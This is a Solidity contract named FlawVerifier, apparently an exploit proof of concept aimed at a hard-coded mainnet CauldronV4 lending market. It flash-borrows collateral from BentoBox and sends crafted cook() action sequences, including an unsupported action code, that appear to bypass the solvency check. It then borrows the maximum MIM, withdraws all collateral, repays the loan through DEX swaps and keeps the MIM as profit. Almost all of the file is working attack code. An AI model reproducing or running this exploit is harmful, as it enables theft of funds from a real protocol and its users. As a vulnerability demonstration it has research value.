// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

struct Rebase {
    uint128 elastic;
    uint128 base;
}

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IFlashBorrowerLike {
    function onFlashLoan(address sender, IERC20Like token, uint256 amount, uint256 fee, bytes calldata data) external;
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256);
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256 amount);
    function toShare(address token, uint256 amount, bool roundUp) external view returns (uint256 share);
    function deposit(address token, address from, address to, uint256 amount, uint256 share)
        external
        payable
        returns (uint256 amountOut, uint256 shareOut);
    function withdraw(address token, address from, address to, uint256 amount, uint256 share)
        external
        returns (uint256 amountOut, uint256 shareOut);
    function flashLoan(IFlashBorrowerLike borrower, address receiver, address token, uint256 amount, bytes calldata data)
        external;
}

interface ICauldronV4Like {
    function cook(uint8[] calldata actions, uint256[] calldata values, bytes[] calldata datas)
        external
        payable
        returns (uint256 value1, uint256 value2);
    function addCollateral(address to, bool skim, uint256 share) external;
    function bentoBox() external view returns (address);
    function collateral() external view returns (address);
    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
    function isSolvent(address user) external view returns (bool);
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function BORROW_OPENING_FEE() external view returns (uint256);
}

interface IUniswapV2RouterLike {
    function factory() external view returns (address);
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract FlawVerifier is IFlashBorrowerLike {
    uint8 internal constant ACTION_REMOVE_COLLATERAL = 4;
    uint8 internal constant ACTION_BORROW = 5;
    uint8 internal constant ACTION_ACCRUE = 8;
    uint8 internal constant ACTION_ADD_COLLATERAL = 10;
    uint8 internal constant ACTION_UNSUPPORTED = 255;

    uint256 internal constant BPS = 10_000;
    uint256 internal constant BORROW_OPENING_FEE_PRECISION = 1e5;

    address public constant TARGET_CAULDRON = 0x46f54d434063e5F1a2b2CC6d9AAa657b1B9ff82c;
    address public constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    ICauldronV4Like public constant TARGET = ICauldronV4Like(TARGET_CAULDRON);

    error ConcretePreconditionFailed(string reason);
    error FlashLoanCallerMismatch(address expected, address actual);
    error FlashLoanSenderMismatch(address expected, address actual);
    error FlashLoanTokenMismatch(address expected, address actual);
    error SelfOnly();

    address public collateralToken;
    address public underlyingToken;
    address public curveLpToken;
    address public convexDepositToken;

    uint256 public flashAmount;
    uint256 public flashFee;
    uint256 public collateralShareAdded;
    uint256 public mimBorrowedShare;
    uint256 public mimProfitAmount;

    bool public validatedBorrowPath;
    bool public validatedRemovePath;
    bool public requireZeroFee;
    bool public usedFeeBuyback;

    bytes public lastAttemptRevertData;

    constructor() {}

    receive() external payable {}

    function execute() external returns (bool) {
        return _execute();
    }

    function run() external returns (bool) {
        return _execute();
    }

    function exploit() external returns (bool) {
        return _execute();
    }

    function executeWithAmount(uint256 amount, bool zeroFeeOnly) external returns (bool) {
        if (msg.sender != address(this)) revert SelfOnly();
        return _executeWithAmount(amount, zeroFeeOnly);
    }

    function _execute() internal returns (bool) {
        collateralToken = TARGET.collateral();
        if (collateralToken == address(0)) revert ConcretePreconditionFailed("NO_COLLATERAL");

        curveLpToken = _readAddress(collateralToken, abi.encodeWithSignature("curveToken()"));
        convexDepositToken = _readAddress(collateralToken, abi.encodeWithSignature("convexToken()"));
        underlyingToken = curveLpToken != address(0) ? curveLpToken : _probeUnderlying(collateralToken);

        uint256 idle = IERC20Like(collateralToken).balanceOf(TARGET.bentoBox());
        if (idle == 0) revert ConcretePreconditionFailed("NO_COLLATERAL_FLASH_LIQUIDITY");

        uint256[12] memory smallCandidates = [
            uint256(1),
            10,
            100,
            1_000,
            10_000,
            100_000,
            1_000_000,
            10_000_000,
            100_000_000,
            1_000_000_000,
            1_000_000_000_000,
            1_000_000_000_000_000
        ];

        for (uint256 i = 0; i < smallCandidates.length; i++) {
            uint256 amount = smallCandidates[i];
            if (amount == 0 || amount > idle) continue;
            if (IBentoBoxLike(TARGET.bentoBox()).toShare(collateralToken, amount, false) == 0) continue;
            try this.executeWithAmount(amount, true) returns (bool ok) {
                if (ok) return true;
            } catch (bytes memory reason) {
                lastAttemptRevertData = reason;
            }
        }

        uint256[8] memory divisors = [uint256(10_000), 1_000, 100, 10, 4, 2, 1, 0];
        for (uint256 i = 0; i < divisors.length; i++) {
            uint256 amount;
            if (divisors[i] == 0) {
                amount = idle;
            } else {
                amount = idle / divisors[i];
            }
            if (amount == 0 || amount > idle) continue;
            try this.executeWithAmount(amount, false) returns (bool ok) {
                if (ok) return true;
            } catch (bytes memory reason) {
                lastAttemptRevertData = reason;
            }
        }

        revert ConcretePreconditionFailed("NO_WORKING_FLASH_CONFIGURATION");
    }

    function _executeWithAmount(uint256 amount, bool zeroFeeOnly) internal returns (bool) {
        flashAmount = amount;
        requireZeroFee = zeroFeeOnly;
        usedFeeBuyback = false;
        validatedBorrowPath = false;
        validatedRemovePath = false;
        collateralShareAdded = 0;
        mimBorrowedShare = 0;
        mimProfitAmount = 0;

        IBentoBoxLike(TARGET.bentoBox()).flashLoan(this, address(this), collateralToken, amount, bytes(""));

        if (!validatedBorrowPath) revert ConcretePreconditionFailed("BORROW_PATH_NOT_VALIDATED");
        if (!validatedRemovePath) revert ConcretePreconditionFailed("REMOVE_PATH_NOT_VALIDATED");
        if (mimProfitAmount == 0) revert ConcretePreconditionFailed("NO_NET_MIM_PROFIT");
        return true;
    }

    function onFlashLoan(address sender, IERC20Like token, uint256 amount, uint256 fee, bytes calldata)
        external
        override
    {
        address bento = TARGET.bentoBox();
        if (msg.sender != bento) revert FlashLoanCallerMismatch(bento, msg.sender);
        if (sender != address(this)) revert FlashLoanSenderMismatch(address(this), sender);
        if (address(token) != collateralToken) revert FlashLoanTokenMismatch(collateralToken, address(token));

        flashAmount = amount;
        flashFee = fee;

        if (requireZeroFee && fee != 0) revert ConcretePreconditionFailed("NON_ZERO_FLASH_FEE");

        uint256 borrowAmount = _maxBorrowableAmount();
        if (borrowAmount == 0) revert ConcretePreconditionFailed("NO_BORROWABLE_MIM");

        _borrowViaCookBypass(borrowAmount);

        uint256 borrowPart = TARGET.userBorrowPart(address(this));
        if (borrowPart == 0) revert ConcretePreconditionFailed("BORROW_NOT_RECORDED");
        if (TARGET.isSolvent(address(this))) revert ConcretePreconditionFailed("BORROW_DID_NOT_CREATE_INSOLVENCY");
        validatedBorrowPath = true;

        uint256 depositAmount = amount;
        if (fee != 0) {
            if (amount <= fee) revert ConcretePreconditionFailed("FLASH_TOO_SMALL_FOR_FEE");
            depositAmount = amount - fee;
        }

        _forceApprove(collateralToken, bento, depositAmount);
        (, collateralShareAdded) = IBentoBoxLike(bento).deposit(collateralToken, address(this), TARGET_CAULDRON, depositAmount, 0);
        if (collateralShareAdded == 0) revert ConcretePreconditionFailed("ZERO_COLLATERAL_SHARE");

        TARGET.addCollateral(address(this), true, collateralShareAdded);
        if (TARGET.userCollateralShare(address(this)) == 0) revert ConcretePreconditionFailed("ADD_COLLATERAL_FAILED");

        uint256 allCollateralShare = TARGET.userCollateralShare(address(this));
        if (allCollateralShare == 0) revert ConcretePreconditionFailed("NO_COLLATERAL_TO_REMOVE");

        _removeViaCookBypass(allCollateralShare);

        if (TARGET.userCollateralShare(address(this)) != 0) revert ConcretePreconditionFailed("COLLATERAL_STILL_PRESENT");
        if (TARGET.userBorrowPart(address(this)) == 0) revert ConcretePreconditionFailed("DEBT_MISSING_AFTER_REMOVE");
        if (TARGET.isSolvent(address(this))) revert ConcretePreconditionFailed("REMOVE_DID_NOT_LEAVE_INSOLVENT");
        validatedRemovePath = true;

        _withdrawAllTokenFromBento(MIM);
        _withdrawAllTokenFromBento(collateralToken);

        if (fee != 0) {
            uint256 collateralBalanceBefore = IERC20Like(collateralToken).balanceOf(address(this));
            if (collateralBalanceBefore < amount + fee) {
                _buyBackCollateralIfNeeded(amount + fee - collateralBalanceBefore);
                usedFeeBuyback = true;
            }
        }

        uint256 finalCollateralBalance = IERC20Like(collateralToken).balanceOf(address(this));
        if (finalCollateralBalance < amount + fee) revert ConcretePreconditionFailed("INSUFFICIENT_COLLATERAL_FOR_FLASH_REPAY");

        _safeTransfer(collateralToken, bento, amount + fee);

        mimProfitAmount = IERC20Like(MIM).balanceOf(address(this));
        if (mimProfitAmount == 0) revert ConcretePreconditionFailed("ZERO_EXTERNAL_MIM_AFTER_REPAY");
    }

    function _borrowViaCookBypass(uint256 amount) internal {
        uint8[] memory actions = new uint8[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);

        actions[0] = ACTION_BORROW;
        actions[1] = ACTION_ACCRUE;
        datas[0] = abi.encode(_toInt256(amount), address(this));
        datas[1] = bytes("");

        TARGET.cook(actions, values, datas);
        mimBorrowedShare = IBentoBoxLike(TARGET.bentoBox()).balanceOf(MIM, address(this));
    }

    function _removeViaCookBypass(uint256 share) internal {
        uint8[] memory actions = new uint8[](2);
        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);

        actions[0] = ACTION_REMOVE_COLLATERAL;
        actions[1] = ACTION_UNSUPPORTED;
        datas[0] = abi.encode(_toInt256(share), address(this));
        datas[1] = bytes("");

        TARGET.cook(actions, values, datas);
    }

    function _maxBorrowableAmount() internal view returns (uint256 amount) {
        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        uint256 availableAmount = bento.toAmount(MIM, bento.balanceOf(MIM, TARGET_CAULDRON), false);
        if (availableAmount == 0) return 0;

        (uint128 totalCap, uint128 perAddressCap) = TARGET.borrowLimit();
        (uint128 totalElastic, uint128 totalBase) = TARGET.totalBorrow();
        uint256 currentPart = TARGET.userBorrowPart(address(this));
        uint256 openingFee = TARGET.BORROW_OPENING_FEE();

        uint256 remainingTotalElastic = totalCap > totalElastic ? uint256(totalCap) - uint256(totalElastic) : 0;
        uint256 remainingPart = perAddressCap > currentPart ? uint256(perAddressCap) - currentPart : 0;
        if (remainingTotalElastic == 0 || remainingPart == 0) return 0;

        uint256 fromTotalCap = (remainingTotalElastic * BORROW_OPENING_FEE_PRECISION) /
            (BORROW_OPENING_FEE_PRECISION + openingFee);

        uint256 maxDebtFromPart = (totalElastic == 0 || totalBase == 0)
            ? remainingPart
            : (remainingPart * uint256(totalElastic)) / uint256(totalBase);
        uint256 fromPartCap = (maxDebtFromPart * BORROW_OPENING_FEE_PRECISION) /
            (BORROW_OPENING_FEE_PRECISION + openingFee);

        amount = _min(availableAmount, _min(fromTotalCap, fromPartCap));
        amount = (amount * 9_995) / BPS;
        if (amount > 1) amount -= 1;
    }

    function _withdrawAllTokenFromBento(address token) internal {
        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        uint256 share = bento.balanceOf(token, address(this));
        if (share != 0) {
            bento.withdraw(token, address(this), address(this), 0, share);
        }
    }

    function _buyBackCollateralIfNeeded(uint256 missingCollateral) internal {
        if (missingCollateral == 0) return;
        if (_tryAcquireExactOutput(MIM, collateralToken, missingCollateral)) return;

        address localUnderlying = underlyingToken;
        if (localUnderlying != address(0) && localUnderlying != collateralToken) {
            uint256 underlyingNeeded = _underlyingForCollateralAmount(missingCollateral);
            if (_tryAcquireExactOutput(MIM, localUnderlying, underlyingNeeded)) {
                if (_wrapAllUnderlying()) return;
            }
        }

        if (_tryAcquireExactOutput(MIM, WETH, 1)) {
            if (_tryAcquireExactOutput(WETH, collateralToken, missingCollateral)) return;
            if (localUnderlying != address(0) && localUnderlying != collateralToken) {
                uint256 underlyingNeeded2 = _underlyingForCollateralAmount(missingCollateral);
                if (_tryAcquireExactOutput(WETH, localUnderlying, underlyingNeeded2)) {
                    if (_wrapAllUnderlying()) return;
                }
            }
        }

        revert ConcretePreconditionFailed("FEE_BUYBACK_ROUTE_NOT_FOUND");
    }

    function _tryAcquireExactOutput(address tokenIn, address tokenOut, uint256 amountOut) internal returns (bool ok) {
        if (tokenIn == address(0) || tokenOut == address(0) || amountOut == 0) return false;
        uint256 balanceIn = IERC20Like(tokenIn).balanceOf(address(this));
        if (balanceIn == 0) return false;

        address[] memory direct = _directPath(tokenIn, tokenOut);
        if (_tryExactOutputSwap(SUSHI_ROUTER, direct, amountOut, balanceIn)) return true;
        if (tokenIn != WETH && tokenOut != WETH) {
            address[] memory viaWeth = _wethPath(tokenIn, tokenOut);
            if (_tryExactOutputSwap(SUSHI_ROUTER, viaWeth, amountOut, balanceIn)) return true;
        }

        balanceIn = IERC20Like(tokenIn).balanceOf(address(this));
        if (_tryExactOutputSwap(UNISWAP_V2_ROUTER, direct, amountOut, balanceIn)) return true;
        if (tokenIn != WETH && tokenOut != WETH) {
            address[] memory viaWethUni = _wethPath(tokenIn, tokenOut);
            if (_tryExactOutputSwap(UNISWAP_V2_ROUTER, viaWethUni, amountOut, balanceIn)) return true;
        }

        return false;
    }

    function _tryExactOutputSwap(address router, address[] memory path, uint256 amountOut, uint256 amountInMax)
        internal
        returns (bool ok)
    {
        if (amountInMax == 0 || amountOut == 0) return false;
        if (path.length < 2 || path[0] == address(0) || path[path.length - 1] == address(0)) return false;
        if (IERC20Like(path[0]).balanceOf(address(this)) < amountInMax) return false;
        if (!_isContract(router) || !_routeExists(router, path)) return false;

        _forceApprove(path[0], router, amountInMax);
        try IUniswapV2RouterLike(router).swapTokensForExactTokens(
            amountOut, amountInMax, path, address(this), block.timestamp
        ) returns (uint256[] memory) {
            return true;
        } catch {
            return false;
        }
    }

    function _wrapAllUnderlying() internal returns (bool) {
        if (underlyingToken == address(0) || underlyingToken == collateralToken) return false;

        address intermediate = underlyingToken;
        uint256 amount = IERC20Like(intermediate).balanceOf(address(this));
        if (amount == 0) return false;

        if (
            curveLpToken != address(0) &&
            convexDepositToken != address(0) &&
            intermediate == curveLpToken &&
            collateralToken != curveLpToken
        ) {
            if (!_wrapTokenInto(convexDepositToken, intermediate, amount)) return false;
            intermediate = convexDepositToken;
            amount = IERC20Like(intermediate).balanceOf(address(this));
            if (amount == 0) return false;
            if (collateralToken == convexDepositToken) return true;
        }

        return _wrapTokenInto(collateralToken, intermediate, amount);
    }

    function _wrapTokenInto(address wrapper, address tokenIn, uint256 amount) internal returns (bool) {
        if (wrapper == address(0) || tokenIn == address(0) || amount == 0) return false;
        _forceApprove(tokenIn, wrapper, amount);
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("deposit(uint256)", amount))) return true;
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("enter(uint256)", amount))) return true;
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("stake(uint256)", amount))) return true;
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("wrap(uint256)", amount))) return true;
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("mint(uint256)", amount))) return true;
        if (_callOptionalNoReturn(wrapper, abi.encodeWithSignature("deposit(uint256,address)", amount, address(this)))) {
            return true;
        }
        return false;
    }

    function _underlyingForCollateralAmount(uint256 collateralAmount) internal view returns (uint256 underlyingAmount) {
        if (underlyingToken == address(0) || underlyingToken == collateralToken) return collateralAmount;
        if (underlyingToken == curveLpToken && convexDepositToken != address(0)) return collateralAmount;

        uint256 totalShares = IERC20Like(collateralToken).totalSupply();
        uint256 backing = IERC20Like(underlyingToken).balanceOf(collateralToken);
        if (totalShares == 0 || backing == 0) return collateralAmount;

        underlyingAmount = (collateralAmount * backing) / totalShares;
        if ((collateralAmount * backing) % totalShares != 0) underlyingAmount += 1;
    }

    function _probeUnderlying(address token) internal view returns (address underlying) {
        underlying = _readAddress(token, abi.encodeWithSignature("curveToken()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("token()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("asset()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("underlying()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("want()"));
        if (underlying != address(0)) return underlying;
        underlying = _readAddress(token, abi.encodeWithSignature("stakingToken()"));
    }

    function _readAddress(address target, bytes memory data) internal view returns (address value) {
        (bool ok, bytes memory result) = target.staticcall(data);
        if (ok && result.length >= 32) {
            value = abi.decode(result, (address));
        }
    }

    function _routeExists(address router, address[] memory path) internal view returns (bool) {
        if (path.length < 2) return false;

        address factory;
        try IUniswapV2RouterLike(router).factory() returns (address resolvedFactory) {
            factory = resolvedFactory;
        } catch {
            return false;
        }

        if (!_isContract(factory)) return false;
        for (uint256 i = 0; i + 1 < path.length; i++) {
            if (IUniswapV2FactoryLike(factory).getPair(path[i], path[i + 1]) == address(0)) {
                return false;
            }
        }
        return true;
    }

    function _isContract(address account) internal view returns (bool) {
        return account.code.length != 0;
    }

    function _callOptionalNoReturn(address target, bytes memory data) internal returns (bool) {
        (bool ok,) = target.call(data);
        return ok;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_RESET_FAILED");

        (ok, data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }

    function _directPath(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
    }

    function _wethPath(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](3);
        path[0] = tokenIn;
        path[1] = WETH;
        path[2] = tokenOut;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _toInt256(uint256 value) internal pure returns (int256 result) {
        require(value <= uint256(type(int256).max), "INT256_OVERFLOW");
        // forge-lint: disable-next-line(unsafe-typecast)
        result = int256(value);
    }
}
